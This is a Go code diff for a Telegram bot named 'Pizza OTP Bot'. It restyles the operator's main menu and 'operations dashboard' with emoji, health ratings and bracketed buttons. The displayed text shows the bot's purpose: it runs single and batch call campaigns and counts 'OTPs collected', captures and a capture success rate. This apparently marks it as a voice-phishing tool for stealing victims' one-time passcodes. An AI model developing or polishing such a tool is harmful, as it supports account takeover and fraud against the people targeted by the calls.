@@ -285,48 +285,67 @@ func (b *Bot) refreshCurrentView(callback *tgbotapi.CallbackQuery, userID int64,
 	b.showMainMenu(callback.Message.Chat.ID, callback.Message.MessageID)
 }
 
-// showMainMenu shows the main menu with inline keyboard
+// showMainMenu shows the main menu with stunning inline keyboard
 func (b *Bot) showMainMenu(chatID int64, messageID int) {
 	stats, _ := b.db.GetGlobalStats()
 	activeCalls := b.GetActiveCalls()
 	
-	text := fmt.Sprintf(`🍕 *Pizza OTP Bot*
+	// Calculate pretty stats
+	successColor := "🟢"
+	if stats.SuccessRate < 50 {
+		successColor = "🟡"
+	}
+	if stats.SuccessRate < 30 {
+		successColor = "🔴"
+	}
+	
+	activeIndicator := "✨"
+	if activeCalls > 0 {
+		activeIndicator = "🔥"
+	}
+	
+	text := fmt.Sprintf(`🍕━━━━━━━━━━━━━━━━━━━━━━━🍕
 
-━━━━━━━━━━━━━━━━━━━━
-🎯 *Quick Stats*
-├ 📞 Active Calls: %d
-├ 📋 Campaigns: %d (Active: %d)
-├ 🔐 Total Captures: %d
-└ 📈 Success Rate: %.1f%%
-━━━━━━━━━━━━━━━━━━━━
+🔮 *WELCOME, OPERATOR* 🔮
 
-👇 *What would you like to do?*`, 
-		activeCalls, stats.TotalCampaigns, stats.ActiveCampaigns, stats.TotalCaptures, stats.SuccessRate)
+━━━━━━━━━━━━━━━━━━━━━━━
+%[1]s *Active Calls:* %[2]d
+📋 *Campaigns:* %[3]d total | %[4]d active
+🔐 *Captures:* %[5]d OTPs collected
+📈 *Success Rate:* %[6]s %.1f%%
+━━━━━━━━━━━━━━━━━━━━━━━
+
+🎯 *SELECT AN ACTION*
+
+`, 
+		activeIndicator, activeCalls, 
+		stats.TotalCampaigns, stats.ActiveCampaigns, 
+		stats.TotalCaptures, successColor, stats.SuccessRate)
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
 	
-	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("📞 Single Call", MarshalCallbackData(ActionSingleCall, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("🚀 Batch Campaign", MarshalCallbackData(ActionBatchStart, nil)),
+	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🎯 [ SINGLE CALL ]", MarshalCallbackData(ActionSingleCall, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🚀 [ BATCH ]", MarshalCallbackData(ActionBatchStart, nil)),
 		},
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("📊 Statistics", MarshalCallbackData(ActionStats, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("📋 My Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
+		{
+			tgbotapi.NewInlineKeyboardButtonData("📊 [ STATS ]", MarshalCallbackData(ActionStats, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📋 [ CAMPAIGNS ]", MarshalCallbackData(ActionCampaigns, nil)),
 		},
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("📝 Templates", MarshalCallbackData(ActionTemplates, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("💬 SMS", MarshalCallbackData(ActionSMS, nil)),
+		{
+			tgbotapi.NewInlineKeyboardButtonData("📝 [ TEMPLATES ]", MarshalCallbackData(ActionTemplates, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("💬 [ SMS ]", MarshalCallbackData(ActionSMS, nil)),
 		},
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("📥 Export", MarshalCallbackData(ActionExport, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("📜 Logs", MarshalCallbackData(ActionLogs, nil)),
+		{
+			tgbotapi.NewInlineKeyboardButtonData("📥 [ EXPORT ]", MarshalCallbackData(ActionExport, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📜 [ LOGS ]", MarshalCallbackData(ActionLogs, nil)),
 		},
-		[]tgbotapi.InlineKeyboardButton{
-			tgbotapi.NewInlineKeyboardButtonData("⚙️ Settings", MarshalCallbackData(ActionConfig, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("❓ Help", MarshalCallbackData(ActionHelp, nil)),
+		{
+			tgbotapi.NewInlineKeyboardButtonData("⚙️ [ SETTINGS ]", MarshalCallbackData(ActionConfig, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("❓ [ HELP ]", MarshalCallbackData(ActionHelp, nil)),
 		},
-	)
+	}
 
 	if messageID > 0 {
 		b.editReplyMarkup(chatID, messageID, text, &keyboard)
@@ -366,7 +385,7 @@ func (b *Bot) showHelp(chatID int64, messageID int) {
 	b.editReplyMarkup(chatID, messageID, text, &keyboard)
 }
 
-// showStats shows statistics
+// showStats shows stunning statistics dashboard
 func (b *Bot) showStats(chatID int64, messageID int) {
 	stats, err := b.db.GetGlobalStats()
 	if err != nil {
@@ -374,40 +393,82 @@ func (b *Bot) showStats(chatID int64, messageID int) {
 		return
 	}
 
-	text := fmt.Sprintf(`📊 *Statistics Overview*
+	// Calculate visual metrics
+	answerRate := float64(0)
+	if stats.TotalCalls > 0 {
+		answerRate = float64(stats.AnsweredCalls) / float64(stats.TotalCalls) * 100
+	}
+	
+	// Visual indicators
+	healthEmoji := "💚"
+	healthText := "EXCELLENT"
+	if stats.SuccessRate < 70 {
+		healthEmoji = "💛"
+		healthText = "GOOD"
+	}
+	if stats.SuccessRate < 50 {
+		healthEmoji = "🧡"
+		healthText = "FAIR"
+	}
+	if stats.SuccessRate < 30 {
+		healthEmoji = "❤️"
+		healthText = "POOR"
+	}
 
-━━━━━━━━━━━━━━━━━━━━
-*📞 Calls*
-├ Total: %d
-├ Answered: %d
-├ Voicemail: %d
-└ Failed: %d
+	text := fmt.Sprintf(`🔮━━━━━━━━━━━━━━━━━━━━━━━━━━🔮
 
-━━━━━━━━━━━━━━━━━━━━
-*📲 Captures*
-├ Total: %d
-├ Today: %d
-├ Success Rate: %.1f%%
+📊 *OPERATIONS DASHBOARD*
 
-━━━━━━━━━━━━━━━━━━━━
-*📋 Campaigns*
-├ Total: %d
-├ Active: %d
-├ Paused: %d
-├ Completed: %d`,
-		stats.TotalCalls, stats.AnsweredCalls, stats.Voicemails, stats.FailedCalls,
-		stats.TotalCaptures, stats.TodayCaptures, stats.SuccessRate,
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+%[1]s *System Health:* %[2]s %[3]s
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📞 *CALL METRICS*
+
+├ 🔔 Total Calls: %[4]d
+├ ✅ Answered: %[5]d
+├ 📬 Voicemail: %[6]d
+├ ❌ Failed: %[7]d
+└ 📊 Answer Rate: %[8].1f%%
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔐 *CAPTURE METRICS*
+
+├ 🎯 Total OTPs: %[9]d
+├ 📱 Today: %[10]d
+└ 💯 Success: %[11]s %[12].2f%%
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 *CAMPAIGN STATUS*
+
+├ 📦 Total: %[13]d
+├ 🟢 Active: %[14]d
+├ 🟡 Paused: %[15]d
+└ ✅ Done: %[16]d
+
+🔮━━━━━━━━━━━━━━━━━━━━━━━━━━🔮`,
+		healthEmoji, healthText, healthEmoji,
+		stats.TotalCalls, stats.AnsweredCalls, stats.Voicemails, stats.FailedCalls, answerRate,
+		stats.TotalCaptures, stats.TodayCaptures, healthEmoji, stats.SuccessRate,
 		stats.TotalCampaigns, stats.ActiveCampaigns, stats.PausedCampaigns, stats.CompletedCampaigns)
 
 	var keyboard tgbotapi.InlineKeyboardMarkup
 	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
 		{
-			tgbotapi.NewInlineKeyboardButtonData("📥 Export", MarshalCallbackData(ActionExport, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("📜 Logs", MarshalCallbackData(ActionLogs, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🎯 [ SINGLE CALL ]", MarshalCallbackData(ActionSingleCall, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🚀 [ BATCH ]", MarshalCallbackData(ActionBatchStart, nil)),
 		},
 		{
-			tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionStats, nil)),
-			tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📥 [ EXPORT ]", MarshalCallbackData(ActionExport, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📜 [ LOGS ]", MarshalCallbackData(ActionLogs, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🔄 [ REFRESH ]", MarshalCallbackData(ActionStats, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("🏠 [ MENU ]", MarshalCallbackData(ActionMainMenu, nil)),
 		},
 	}
 
